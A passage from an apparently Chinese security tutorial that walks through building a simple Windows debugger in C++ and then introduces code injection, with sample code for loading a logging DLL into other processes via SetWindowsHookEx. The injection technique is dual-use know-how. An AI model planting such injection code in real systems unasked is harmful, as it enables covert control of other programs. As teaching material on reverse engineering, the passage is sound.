<li><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://www.exploit-db.com/docs/35355.pdf">Deep Dive into ROP Payload Analysis</a></span></span></li>
</ul>
<h2 class="md-end-block md-heading">调试器和安全编程技巧</h2>
<p><span class="md-line md-end-block">调试器被称为“黑客之瞳”。调试器能跟踪一个进程的运行时状态。大多数调试器具有运行、暂停执行和单步执行、设置断点、修改寄存器和内存数据值以及捕获发生在目标进程的异常事件。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>调试器应当具备两种能力：</strong></span></span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block"><span class=""><strong>打开一个可执行文件并使之以自身进程的形式运行起来的能力</strong></span></span></li>
<li><span class="md-line md-end-block"><span class=""><strong>附加一个现有进程的能力</strong></span></span></li>
</ul>
<p><img class="alignnone size-full wp-image-99909 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489198396343.png" alt=".1489198396343" width="1201" height="738" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489198396343.png 1201w, http://www.mottoin.com/wp-content/uploads/2017/04/1489198396343-300x184.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489198396343-768x472.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489198396343-1024x629.png 1024w" sizes="(max-width: 1201px) 100vw, 1201px" /> <img class="alignnone size-full wp-image-99910 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489198921980.png" alt=".1489198921980" width="1238" height="632" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489198921980.png 1238w, http://www.mottoin.com/wp-content/uploads/2017/04/1489198921980-300x153.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489198921980-768x392.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489198921980-1024x523.png 1024w" sizes="(max-width: 1238px) 100vw, 1238px" /> <img class="alignnone size-full wp-image-99911 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/调试器.png" alt=".调试器" width="1935" height="1794" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/调试器.png 1935w, http://www.mottoin.com/wp-content/uploads/2017/04/调试器-300x278.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/调试器-768x712.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/调试器-1024x949.png 1024w" sizes="(max-width: 1935px) 100vw, 1935px" /></p>
<h3 class="md-end-block md-heading">调试器的工作原理</h3>
<p><span class="md-line md-end-block">最简单的调试器代码wdbg01a.cpp：</span></p>
<pre>#include "stdafx.h"
#include &lt;Windows.h&gt;
int _tmain(int argc, _TCHAR* argv[])
{
 PROCESS_INFORMATION pi;
 STARTUPINFO si;
 
 if(argc &lt; 2){
 fprintf(stderr, "C:\\&gt;%s &lt;sample.exe&gt;\n", argv[0]);
 return 1;
 }

memset(&amp;pi, 0, sizeof(pi));
 memset(&amp;si, 0, sizeof(si));
 si.cb = sizeof(STARTUPINFO);
//通过GreateProcess()函数启动调试目标进程(也叫调试对象或者被调试程序debugge)
 BOOL r = CreateProcess(
 NULL, argv[1], NULL, NULL, FALSE, 
 NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS,
 NULL, NULL, &amp;si, &amp;pi);
 if(!r)
 return -1;

ResumeThread(pi.hThread);

while(1) {
 DEBUG_EVENT de;
 if(!WaitForDebugEvent(&amp;de, INFINITE))
 break;
 
 DWORD dwContinueStatus = DBG_CONTINUE;
 
 switch(de.dwDebugEventCode)
 {
 case CREATE_PROCESS_DEBUG_EVENT:
 printf("CREATE_PROCESS_DEBUG_EVENT\n");
 break;
 case CREATE_THREAD_DEBUG_EVENT:
 printf("CREATE_THREAD_DEBUG_EVENT\n");
 break;
 case EXIT_THREAD_DEBUG_EVENT:
 printf("EXIT_THREAD_DEBUG_EVENT\n");
 break;
 case EXIT_PROCESS_DEBUG_EVENT:
 printf("EXIT_PROCESS_DEBUG_EVENT\n");
 break;
 case EXCEPTION_DEBUG_EVENT:
 if(de.u.Exception.ExceptionRecord.ExceptionCode != 
 EXCEPTION_BREAKPOINT)
 {
 dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;
 }
 printf("EXCEPTION_DEBUG_EVENT\n");
 break;
 case OUTPUT_DEBUG_STRING_EVENT:
 printf("OUTPUT_DEBUG_STRING_EVENT\n");
 break;
 case RIP_EVENT:
 printf("RIP_EVENT\n");
 break;
 case LOAD_DLL_DEBUG_EVENT:
 printf("LOAD_DLL_DEBUG_EVENT\n");
 break;
 case UNLOAD_DLL_DEBUG_EVENT:
 printf("UNLOAD_DLL_DEBUG_EVENT\n");
 break;
 }
 if(de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
 break;
 ContinueDebugEvent(
 de.dwProcessId, de.dwThreadId, dwContinueStatus);
 }

CloseHandle(pi.hThread);
 CloseHandle(pi.hProcess);
 return 0;
}</pre>
<p><span class="md-line md-end-block">调用CreateProcess函数时，若设置了<span spellcheck="false"><code>DEBUG_PROCESS</code></span>或 <span spellcheck="false"><code>DEBUG_ONLY_THIS_PROCESS</code></span>标志，则启动的进程(测试对象)中所产生的异常都会被调试器捕捉到。</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block"><span class=""><strong><span spellcheck="false"><code>DEBUG_PROCESS</code></span>:</strong></span>调试对象所产生的子进程，以及子进程的子进程作为调试对象。</span></li>
<li><span class="md-line md-end-block"><span class=""><strong><span spellcheck="false"><code>DEBUG_ONLY_THIS_PROCESS</code></span>:</strong></span>只将通过Create Process启动的那一个进程作为调试对象。</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">CreateProcess函数的第1参数或者第2参数可用于传递目标程序的路径，然后便可以启动进程。</span></p></blockquote>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx">CreateProcess函数</a></span>(<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425">https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425</a></span>(v=vs.85).aspx)：</span></p>
<pre>BOOL WINAPI CreateProcess(
 _In_opt_ LPCTSTR lpApplicationName, //可执行模块名称
 _Inout_opt_ LPTSTR lpCommandLine, //命令行字符串
 _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, 
 _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
 _In_ BOOL bInheritHandles, //句柄继承选项
 _In_ DWORD dwCreationFlags, //创建标志
 _In_opt_ LPVOID lpEnvironment, //新进程的环境变量块
 _In_opt_ LPCTSTR lpCurrentDirectory, //当前路径
 _In_ LPSTARTUPINFO lpStartupInfo, //启动信息
 _Out_ LPPROCESS_INFORMATION lpProcessInformation //进程信息
);</pre>
<p><span class="md-line md-end-block">通过<span spellcheck="false"><code>CREATE_SUSPENDED</code></span>标志可以让进程在启动后进入挂起状态。当设置这一标志时，<span spellcheck="false"><code>CreateProcess</code></span>函数调用完成之后，新进程中的所有线程都会暂停。尽管程序没有在运行，但程序 的可执行文件已经被加载到内存，这时可以对调试对象的数据进行改写。</span></p>
<p><span class="md-line md-end-block">在此程序中，没有任何操作而是直接调用了<span spellcheck="false"><code>ResumeThread</code></span>函数，这时调试对象的所有线程就会恢复运行。</span></p>
<p><span class="md-line md-end-block">ResumeThread函数：</span></p>
<pre>DWORD WINAPI ResumeThread(
 _In_ HANDLE hThread //线程句柄
);</pre>
<p><span class="md-line md-end-block">当调试对象程序开始运行之后，调试器就开始等待捕捉异常。</span><span class="md-line md-end-block">调试事件会通过<span spellcheck="false"><code>WaitForDebugEvent</code></span>函数来进行接收。</span></p>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423(v=vs.85).aspx">WaitForDebugEvent</a></span>函数（<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423">https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423</a></span>(v=vs.85).aspx）：</span></p>
<pre>BOOL WINAPI WaitForDebugEvent(
 //保存调试事件信息的结构体指针
 _Out_ LPDEBUG_EVENT lpDebugEvent,
 //事件等待事件(毫秒)
 _In_ DWORD dwMilliseconds
);</pre>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>WaitForDebugEvent</code></span>函数的第1参数传递了一个DEBUG_EVENT结构体，捕捉到的调试事件会被存放在这个结构体中，第二参数dwMilliseconds如果设置了INFINITE则表示一直等待。</span></p>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308(v=vs.85).aspx">DEBUG_EVENT</a></span>结构体（<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308">https://msdn.microsoft.com/enus/library/windows/desktop/ms679308</a></span>(v=vs.85).aspx）的定义如下：</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">typedef struct _DEBUG_EVENT {
  DWORD dwDebugEventCode;
  DWORD dwProcessId;
  DWORD dwThreadId;
  union {
    EXCEPTION_DEBUG_INFO      Exception;
    CREATE_THREAD_DEBUG_INFO  CreateThread;
    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
    EXIT_THREAD_DEBUG_INFO    ExitThread;
    EXIT_PROCESS_DEBUG_INFO   ExitProcess;
    LOAD_DLL_DEBUG_INFO       LoadDll;
    UNLOAD_DLL_DEBUG_INFO     UnloadDll;
    OUTPUT_DEBUG_STRING_INFO  DebugString;
    RIP_INFO                  RipInfo;
  } u;
} DEBUG_EVENT, *LPDEBUG_EVENT;</pre>
<p><span class="md-line md-end-block">其中第一个成员dwDebugEventCode代表调试事件编号。</span><span class="md-line md-end-block"><span spellcheck="false"><code>dwProcessID</code></span>为进程ID，<span spellcheck="false"><code>dwThreadID</code></span>为线程ID。</span></p>
<p><img class="alignnone size-full wp-image-99912 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图20170406110641.png" alt="QQ截图20170406110641" width="936" height="475" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图20170406110641.png 936w, http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图20170406110641-300x152.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图20170406110641-768x390.png 768w" sizes="(max-width: 936px) 100vw, 936px" /></p>
<blockquote><p><span class="md-line md-end-block">wdbg01a.cpp中，当接收到调试事件时，会使用printf函数将事件的内容显示出来。通过访问union定义的结构体就可获得调试对象的信息</span></p>
<p><span class="md-line md-end-block">当处理器被交给调试器时，调试对象会暂停运行。因此，在调试器显示消息的过程中，调试对象出于暂停状态。</span></p>
<p><span class="md-line md-end-block">调用ContinueDebugEvent函数可以让调试对象恢复运行，这时调试器又回到WaitForDebugEvent函数等待下一条调试事件。</span></p></blockquote>
<p><span class="md-line md-end-block">运行示例：</span></p>
<p><img class="alignnone size-full wp-image-99913 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489219141371.png" alt=".1489219141371" width="1696" height="687" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489219141371.png 1696w, http://www.mottoin.com/wp-content/uploads/2017/04/1489219141371-300x122.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489219141371-768x311.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489219141371-1024x415.png 1024w" sizes="(max-width: 1696px) 100vw, 1696px" /></p>
<blockquote><p><span class="md-line md-end-block">创建进程、线程、以及加载、卸载DLL等事件被调试器捕捉到。</span></p></blockquote>
<h3 class="md-end-block md-heading">实现反汇编功能</h3>
<p><span class="md-line md-end-block">在发生异常的时候，能够显示发生异常的地址以及当前寄存器的值，也能显示发生异常时所执行的指令，这就要实现反汇编功能。</span></p>
<p><span class="md-line md-end-block">可以使用<span class=""><a spellcheck="false" href="https://github.com/vmt/udis86">udis86</a></span>这个开源的反汇编器实现反汇编。<br />
</span><span class="md-line md-end-block">(本书作者提供的编译后的版本<span spellcheck="false"><a href="https://github.com/kenjiaiko/udis86">https://github.com/kenjiaiko/udis86</a></span>)</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">#include "stdafx.h"

#include &lt;Windows.h&gt;
#include "udis86.h"

#pragma comment(lib, "libudis86.lib")


int disas(unsigned char *buff, char *out, int size)
{
	ud_t ud_obj;
	ud_init(&amp;ud_obj);
	ud_set_input_buffer(&amp;ud_obj, buff, 32);

	ud_set_mode(&amp;ud_obj, 32);

	ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL);

	if(ud_disassemble(&amp;ud_obj)){
		sprintf_s(out, size, "%14s  %s", 
			ud_insn_hex(&amp;ud_obj), ud_insn_asm(&amp;ud_obj));
	}else{
		return -1;
	}

	return (int)ud_insn_len(&amp;ud_obj);
}


int exception_debug_event(DEBUG_EVENT *pde)
{
	DWORD dwReadBytes;

	HANDLE ph = OpenProcess(
		PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION, 
		FALSE, pde-&gt;dwProcessId);
	if(!ph)
		return -1;

	HANDLE th = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 
		FALSE, pde-&gt;dwThreadId);
	if(!th)
		return -1;

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(th, &amp;ctx);
	
	char asm_string[256];
	unsigned char asm_code[32];

	ReadProcessMemory(ph, (VOID *)ctx.Eip, asm_code, 32, &amp;dwReadBytes);
	if(disas(asm_code, asm_string, sizeof(asm_string)) == -1)
		asm_string[0] = '\0';

	printf("Exception: %08x (PID:%d, TID:%d)\n", 
		pde-&gt;u.Exception.ExceptionRecord.ExceptionAddress,
		pde-&gt;dwProcessId, pde-&gt;dwThreadId);
	printf("  %08x: %s\n", ctx.Eip, asm_string);
	printf("    Reg: EAX=%08x ECX=%08x EDX=%08x EBX=%08x\n", 
		ctx.Eax, ctx.Ecx, ctx.Edx, ctx.Ebx);
	printf("         ESI=%08x EDI=%08x ESP=%08x EBP=%08x\n", 
		ctx.Esi, ctx.Edi, ctx.Esp, ctx.Ebp);

	SetThreadContext(th, &amp;ctx);
	CloseHandle(th);
	CloseHandle(ph);
	return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	if(argc &lt; 2){
		fprintf(stderr, "C:\\&gt;%s &lt;sample.exe&gt;\n", argv[0]);
		return 1;
	}

	memset(&amp;pi, 0, sizeof(pi));
	memset(&amp;si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);

	BOOL r = CreateProcess(
		NULL, argv[1], NULL, NULL, FALSE, 
		NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS,
		NULL, NULL, &amp;si, &amp;pi);
	if(!r)
		return -1;

	ResumeThread(pi.hThread);

	int process_counter = 0;

	do{
		DEBUG_EVENT de;
		if(!WaitForDebugEvent(&amp;de, INFINITE))
			break;
		
		DWORD dwContinueStatus = DBG_CONTINUE;
		
		switch(de.dwDebugEventCode)
		{
		case CREATE_PROCESS_DEBUG_EVENT:
			process_counter++;
			break;
		case EXIT_PROCESS_DEBUG_EVENT:
			process_counter--;
			break;
		case EXCEPTION_DEBUG_EVENT:
			if(de.u.Exception.ExceptionRecord.ExceptionCode != 
				EXCEPTION_BREAKPOINT)
			{
				dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;
			}
			exception_debug_event(&amp;de);
			break;
		}

		ContinueDebugEvent(
			de.dwProcessId, de.dwThreadId, dwContinueStatus);

	}while(process_counter &gt; 0);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return 0;
}</pre>
<p><span class="md-line md-end-block">disas函数负责对机器语言进行反汇编，在此使用了udis86的功能。</span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>execption_debug_event</code></span>函数会在发生异常时运行，其中调用了下列函数：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block"><span spellcheck="false"><code>OpenProcess</code></span>（<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320</a></span>(v=vs.85).aspx）</span></li>
<li><span class="md-line md-end-block"><span spellcheck="false"><code>ReadProcessMemory</code></span>(<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553">https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553</a></span>(v=vs.85).aspx)</span></li>
<li><span class="md-line md-end-block"><span spellcheck="false"><code>OpenThread</code></span>(<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335</a></span>(v=vs.85).aspx)</span></li>
<li><span class="md-line md-end-block"><span spellcheck="false"><code>GetThreadContext</code></span>(<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362">https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362</a></span>(v=vs.85).aspx)</span></li>
<li><span class="md-line md-end-block"><span spellcheck="false"><code>SetThreadContext</code></span>()</span></li>
</ul>
<p><span class="md-line md-end-block">以上函数再加上<span spellcheck="false"><code>WriteProcessMemory</code></span>数（<span spellcheck="false"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674">https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674</a></span>(v=vs.85).aspx），就是用于访问其他进程的必要函数。</span></p>
<p><span class="md-line md-end-block">在Windows中，即便程序不作为调试器挂载在目标进程上，只要能够获取目标进程的句柄，就可随意读写该进程的内存空间。若当前用户没有相应的权限，调用OpenProcess会失败，但只要能够通过其他方法获取进程句柄，也可自由读写该进程的内存空间。</span></p>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx">OpenProcess</a></span>函数：</span></p>
<pre>HANDLE WINAPI OpenProcess(
 _In_ DWORD dwDesiredAccess, //访问标志
 _In_ BOOL bInheritHandle, //句柄继承选项
 _In_ DWORD dwProcessId //进程ID
);</pre>
<p><span class="md-line md-end-block">在<span spellcheck="false"><code>exeception_debug_event</code></span>函数中，为了获取发生异常时所执行的指令，需要<span spellcheck="false"><code>ReadProcessMemory</code></span>函数。</span></p>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx">ReadProcessMemory</a></span>函数：</span></p>
<pre>BOOL WINAPI ReadProcessMemory(
 _In_ HANDLE hProcess, //进程句柄
 _In_ LPCVOID lpBaseAddress, //读取起始地址
 _Out_ LPVOID lpBuffer, //存放数据的缓冲区
 _In_ SIZE_T nSize, //要读取字节数
 _Out_ SIZE_T *lpNumberOfBytesRead //实际读取字节数
);</pre>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx">WriteProcessMemory</a></span>函数：</span></p>
<pre>BOOL WINAPI WriteProcessMemory(
 _In_ HANDLE hProcess, //进程句柄
 _In_ LPVOID lpBaseAddress, //写入起始地址
 _In_ LPCVOID lpBuffer, //数据缓冲区
 _In_ SIZE_T nSize, //要写入的字节数
 _Out_ SIZE_T *lpNumberOfBytesWritten //实际写入的字节数
);</pre>
<p><span class="md-line md-end-block">接下来是对寄存器的读写：</span><span class="md-line md-end-block">用<span spellcheck="false"><code>OpenThread</code></span>打开线程之后，可通过<span spellcheck="false"><code>GetThreadContext</code></span>和<span spellcheck="false"><code>SetThreadContext</code></span>来读写寄存器。</span></p>
<p><span class="md-line md-end-block">由于不需要在execption_debug_event中改写寄存器的值，因此不需要调用SetThreadContext函数。</span></p>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335(v=vs.85).aspx">OpenThread</a></span>函数：</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">HANDLE WINAPI OpenThread(
  _In_ DWORD dwDesiredAccess, //访问标志
  _In_ BOOL  bInheritHandle, //句柄继承选项
  _In_ DWORD dwThreadId  //线程ID
);</pre>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362(v=vs.85).aspx">GetThreadContext</a></span>函数：</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">BOOL WINAPI GetThreadContext(
  _In_    HANDLE    hThread, //拥有上下文的线程句柄
  _Inout_ LPCONTEXT lpContext //接收上下文的结构体地址
);</pre>
<p><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680632(v=vs.85).aspx">SetThreadContext</a></span></span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">BOOL WINAPI SetThreadContext(
  _In_       HANDLE  hThread, //拥有上下文的线程句柄
  _In_ const CONTEXT *lpContext //存放上下文的结构体地址
);</pre>
<p><span class="md-line md-end-block">使用这些API函数就可操作其他进程。</span></p>
<p><span class="md-line md-end-block">使用改良版的调试器wdbg02a.exe对 一个异常程序test.exe调试：</span></p>
<p><img class="alignnone size-full wp-image-99914 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489224170719.png" alt=".1489224170719" width="771" height="275" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489224170719.png 771w, http://www.mottoin.com/wp-content/uploads/2017/04/1489224170719-300x107.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489224170719-768x274.png 768w" sizes="(max-width: 771px) 100vw, 771px" /></p>
<p><span class="md-line md-end-block">在 mov byte[eax]，0xff的地方发生了第二个异常，对应test.exe源码中的<span spellcheck="false"><code>*s=0xFF</code></span>这行。</span></p>
<h2 class="md-end-block md-heading">代码注入</h2>
<p><span class="md-line md-end-block">在其他进程中运行任意代码的手法，统称为代码注入。在使用DLL的情况下，一般叫做“DLL注入”，但“在其他进程中运行自己的代码”这点是共通的。</span></p>
<p><img class="alignnone size-full wp-image-99915 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491402463265.png" alt=".1491402463265" width="591" height="302" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1491402463265.png 591w, http://www.mottoin.com/wp-content/uploads/2017/04/1491402463265-300x153.png 300w" sizes="(max-width: 591px) 100vw, 591px" /></p>
<p><span class="md-line md-end-block">首先向目标进程target.exe插入代码与数据，在此过程中，代码以线程(Thread Procedure)形式插入，而代码中使用的数据则以线程参数的形式传入。即代码与数据是分别注入的。</span></p>
<p><span class="md-line md-end-block">关于代码注入知名文章：</span><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Proces">Three-Ways-to-Inject-Your-Code-into-Another-Proces</a></span></span></p>
<h3 class="md-end-block md-heading">用SetWindowsHookEx劫持系统消息</h3>
<p><span class="md-line md-end-block">用以下三个API函数，可以劫持系统消息</span></p>
<ul class="ul-list" data-mark="-">
<li><span class="md-line md-end-block">SetWindowsHookEx</span></li>
<li><span class="md-line md-end-block">CallNextHookEx</span></li>
<li><span class="md-line md-end-block">UnhookWindowsHookEx</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">这些函数都是Windows官方API ，可以因为用于单个线程，也可以用于进程</span></p></blockquote>
<blockquote><p><span class="md-line md-end-block">SetWidowsHookEx的功能是将原本传递给窗口过程的消息劫持下来，交给第二参数所指定的函数来进行处理</span></p></blockquote>
<p><span class="md-line md-end-block">SetWindowsHookEx:</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">HHOOK WINAPI SetWindowsHookEx(
  _In_ int       idHook, //钩子类型
  _In_ HOOKPROC  lpfn, //钩子过程
  _In_ HINSTANCE hMod, //应用程序实例的句柄
  _In_ DWORD     dwThreadId //线程ID
);</pre>
<p><span class="md-line md-end-block">CallNextHookEx：</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">LRESULT WINAPI CallNextHookEx(
  _In_opt_ HHOOK  hhk, //当前钩子的句柄
  _In_     int    nCode,  //传递给钩子过程的代码
  _In_     WPARAM wParam, //传递给钩子过程的值
  _In_     LPARAM lParam //传递给钩子过程的值
);</pre>
<p><span class="md-line md-end-block">UnhookWindowsHookEx：</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">BOOL WINAPI UnhookWindowsHookEx(
  _In_ HHOOK hhk   //要解除的对象的钩子过程句柄
);</pre>
<p><span class="md-line md-end-block">例子：</span></p>
<p><span class="md-line md-end-block">将loging.cpp编译成DLL，然后调用SetWindowsHookEx，将其第4参数(dwThreadId)设为0.这样就可以对持有窗口过程的进程和线程应用钩子，也就是加载目标DLL。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// dllmain.cp
//

#include "stdafx.h"


int WriteLog(TCHAR *szData)
{
	TCHAR szTempPath[1024];
	GetTempPath(sizeof(szTempPath), szTempPath);
	lstrcat(szTempPath, "loging.log");
	
	TCHAR szModuleName[1024];
	GetModuleFileName(GetModuleHandle(NULL), 
		szModuleName, sizeof(szModuleName));

	TCHAR szHead[1024];
	wsprintf(szHead, "[PID:%d][Module:%s] ", 
		GetCurrentProcessId(), szModuleName);

	HANDLE hFile = CreateFile(
		szTempPath, GENERIC_WRITE, 0, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return -1;

	SetFilePointer(hFile, 0, NULL, FILE_END);

	DWORD dwWriteSize;
	WriteFile(hFile, szHead, lstrlen(szHead), &amp;dwWriteSize, NULL);
	WriteFile(hFile, szData, lstrlen(szData), &amp;dwWriteSize, NULL);

	CloseHandle(hFile);
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WriteLog("DLL_PROCESS_ATTACH\n");
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		WriteLog("DLL_PROCESS_DETACH\n");
		break;
	}
	return TRUE;
}</pre>
<p><span class="md-line md-end-block">向以上代码添加代码，使得在DLL成功加载之后，向<span spellcheck="false"><code>%TEMP%</code></span>目录输出一个名为loging.log的日志文件。日志内容是进程ID和模块路径。</span></p>
<pre class="md-fences mock-cm md-end-block" lang="" contenteditable="false">// setwindowshook.cpp
//

#include "stdafx.h"
#include &lt;Windows.h&gt;


int _tmain(int argc, _TCHAR* argv[])
{
	if(argc &lt; 2){
		fprintf(stderr, "%s &lt;DLL Name&gt;\n", argv[0]);
		return 1;
	}

	HMODULE h = LoadLibrary(argv[1]);
	if(h == NULL)
		return -1;

	int (__stdcall *fcall) (VOID);
	fcall = (int (WINAPI *)(VOID))
		GetProcAddress(h, "CallSetWindowsHookEx");
	if(fcall == NULL){
		fprintf(stderr, "ERROR: GetProcAddress\n");
		goto _Exit;
	}

	int (__stdcall *ffree) (VOID);
	ffree = (int (WINAPI *)(VOID))
		GetProcAddress(h, "CallUnhookWindowsHookEx");
	if(ffree == NULL){
		fprintf(stderr, "ERROR: GetProcAddress\n");
		goto _Exit;
	}

	if(fcall()){
		fprintf(stderr, "ERROR: CallSetWindowsHookEx\n");
		goto _Exit;
	}
	printf("Call SetWindowsHookEx\n");

	getchar();

	if(ffree()){
		fprintf(stderr, "ERROR: CallUnhookWindowsHookEx\n");
		goto _Exit;
	}
	printf("Call UnhookWindowsHookEx\n");

_Exit:
	FreeLibrary(h);
	return 0;
}</pre>
<p><span class="md-line md-end-block">打开<span spellcheck="false"><code>C:\Users\b404\AppData\Local\Temp\loging.log</code></span>文件：</span></p>
<p><img class="alignnone size-full wp-image-99916 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1491377631991.png" alt=".1491377631991" width="1914" height="808" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1491377631991.png 1914w, http://www.mottoin.com/wp-content/uploads/2017/04/1491377631991-300x127.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1491377631991-768x324.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1491377631991-1024x432.png 1024w" sizes="(max-width: 1914px) 100vw, 1914px" /></p>
<h3 class="md-end-block md-heading">将DLL路径配置到注册表的AppLnit_DLLs项</h3>
